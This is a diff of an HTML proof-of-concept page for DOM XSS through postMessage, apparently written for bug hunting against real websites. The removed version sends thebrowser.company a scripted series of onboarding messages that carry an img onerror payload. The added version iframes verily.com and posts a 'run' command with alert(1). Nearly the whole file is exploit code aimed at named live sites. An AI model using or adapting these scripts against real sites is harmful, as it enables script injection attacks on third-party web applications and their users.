@@ -1,81 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>🔥 DOM XSS Exploit - thebrowser.company</title>
-  <style>
-    body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 20px; }
-  </style>
+  <meta charset="UTF-8">
+  <title>PoC: XSS via postMessage on verily.com</title>
 </head>
 <body>
-  <h1>✅ DOM XSS Exploit via postMessage</h1>
-  <iframe id="target" src="https://thebrowser.company" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+  <h2>✅ Loaded iframe of verily.com</h2>
+  <iframe id="target" src="https://verily.com" width="100%" height="600"></iframe>
 
   <script>
-    const iframe = document.getElementById("target");
-    const payload = `<img src=x onerror="alert('🔥 DOM XSS Confirmed')">`;
+    const payload = {
+      cmd: "run",
+      payload: "alert(1)"
+    };
 
-    const messages = [
-      {
-        label: "Reset dismissed",
-        msg: {
-          message: "OB_RESET_DISMISSED",
-          content: { dismissed: false }
-        }
-      },
-      {
-        label: "Reset completed",
-        msg: {
-          message: "OB_RESET_ONBOARDING",
-          content: { completed: false }
-        }
-      },
-      {
-        label: "Enable onboarding",
-        msg: {
-          message: "OB_ENABLE_ALL",
-          content: {
-            __ONBOARDING_ALLOWED__: true,
-            OB_SESSION_STARTED: true,
-            OB_ONBOARDING_SESSION: true
-          }
-        }
-      },
-      {
-        label: "Show picker",
-        msg: { message: "OB_SHOW_PICKER" }
-      },
-      {
-        label: "Should show picker",
-        msg: {
-          message: "OB_SHOULD_SHOW_PICKER",
-          content: {
-            marketerId: [payload]
-          }
-        }
-      },
-      {
-        label: "Open picker",
-        msg: {
-          message: "OB_OPEN_PICKER",
-          content: {
-            marketerId: [payload]
-          }
-        }
-      }
-    ];
+    const sendExploit = () => {
+      const iframe = document.getElementById("target");
+      if (!iframe) return;
+      iframe.contentWindow.postMessage(payload, "*");
+      console.log("🚀 XSS payload sent via postMessage");
+    };
 
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
-      let delay = 0;
-      messages.forEach(({ label, msg }, i) => {
-        setTimeout(() => {
-          console.log(`🚀 Sending: ${label}`);
-          iframe.contentWindow.postMessage(msg, "*");
-        }, delay);
-        delay += 1000; // تأخير 1 ثانية بين كل رسالة
-      });
+    window.onload = () => {
+      setTimeout(sendExploit, 3000); // تأخير بسيط بعد تحميل iframe
     };
   </script>
 </body>
